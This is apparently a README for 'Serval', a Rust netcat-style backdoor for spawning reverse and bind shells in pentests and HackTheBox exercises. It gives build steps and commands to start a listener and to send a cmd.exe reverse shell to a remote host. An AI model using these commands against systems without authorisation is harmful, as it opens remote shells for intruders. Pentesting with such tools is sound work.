## A Netcat style backdoor for pentesting and pentest challenges

Serval is a lightweight, easy-to-use, binary for spawning reverse and bind shells for pentests or pentesting exercises. Serval is cross platform and can be compiled for both Windows 32 & 64-bit and Linux 32 and 64-bit. Note: Due to the flexibility of Rust
it may be possible to compile for other platforms (such as ARM) but I have not tested for other platforms. 

### Why? 
I developed Serval to remove my dependecy on netcat during HacktheBox challenges since it can be bothersome to find netcat binaries for Windows (especially with the -e option) and it is even more difficult to find a binary from a trusted source.

### Installation

#### Rust Users (Compile from source)

Download the source from github
> git clone https://github.com/tgadola/serval.git && cd serval-master

*Optional: Edit the build file at .cargo/config to rewrite your buildpath.

Build the binary for your current platform. 
> cargo build --release

You can build for other platforms using 
> cargo build --release --target \<target-triple>

#### Other
Pre-built binaries coming soon! Check back in a few days! 

### Usage

By default Serval will either listen or connect to a port and pipe standard input and output to that connection. The -e flag will spawn a process and pipe its standard input and output across the network. 

#### Start a listener
Serval listens on all interfaces
> serval -l 4400

#### Spawn a reverse shell 
> serval \<listening ip> \<listening port> -q -e cmd.exe

#### ????

#### Profit

### License

Apache 2.0. See the License file for more info.